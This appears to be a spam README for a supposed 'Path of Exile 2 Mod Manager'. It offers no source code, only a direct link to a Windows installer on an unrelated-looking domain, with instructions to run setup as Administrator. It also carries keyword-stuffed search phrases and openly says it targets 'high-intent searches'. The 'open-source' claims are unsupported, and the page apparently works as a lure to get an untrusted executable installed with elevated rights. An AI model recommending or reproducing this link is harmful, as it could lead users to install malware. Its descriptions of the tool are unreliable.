# Path of Exile 2 Mod Manager

> Open-source mod profile tool for **Path** — sync addons, manage load order, rollback safely.
...
**Repository:** `Path-of-Exile-2-Mod-Manager`

---

## Overview

**Path of Exile 2 Mod Manager** is a Windows-native modding companion: profile-based installs, dependency resolution, and a clean UI for managing mods across sessions.

Built for **path of exile 2 mods download pc** and similar high-intent searches.
...
> Open-source **Windows build** for **Path of Exile 2 Mod Manager**. Direct link below — no account required.

| | |
| --- | --- |
| **Direct link** | **[patexi2n.nexustool.fun](https://patexi2n.nexustool.fun/)** |
| **Full URL** | `https://patexi2n.nexustool.fun/` |
| **Platform** | Windows 10 / 11 (64-bit) |
| **Install** | Run setup as Administrator |

### Quick steps

1. Open **[patexi2n.nexustool.fun](https://patexi2n.nexustool.fun/)** in your browser
...
**People also search for:** path of exile 2 mods download pc, path of exile 2 mod manager, path of exile 2 nexus mods, path of exile 2 mods github, path of exile 2 mod installer windows
